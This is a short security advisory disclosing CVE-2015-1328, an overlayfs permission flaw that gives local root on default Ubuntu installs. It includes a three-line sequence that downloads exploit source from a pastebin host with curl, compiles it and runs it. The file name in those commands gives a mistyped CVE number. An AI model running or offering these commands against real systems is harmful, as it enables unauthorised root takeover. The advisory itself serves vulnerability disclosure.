CVE-2015-1328: incorrect permission checks in overlayfs, ubuntu local root

From: Philip Pettersson <philip.pettersson () gmail com>
Date: Tue, 16 Jun 2015 09:17:28 +0900

This is CVE-2015-1328 which allows a local root privilege escalation
in the default configuration on all currently supported versions of Ubuntu.

The overlayfs filesystem does not correctly check file permissions when
creating new files in the upper filesystem directory. This can be exploited
by an unprivileged process in kernels with CONFIG_USER_NS=y and where
overlayfs has the FS_USERNS_MOUNT flag, which allows the mounting of overlayfs
inside unprivileged mount namespaces. This is the default configuration of
Ubuntu 12.04, 14.04, 14.10, and 15.04 [1].

[SAMPLES]

 # curl http://pastebin.com/raw.php?i=aQD0LC7w -o cve-2015-1238.c
 # gcc cve-2015-1238.c -o cve-2015-1238
 # ./cve-2015-1238





http://seclists.org/oss-sec/2015/q2/717
http://pastebin.com/raw.php?i=aQD0LC7w
http://blog.emilburzo.com/
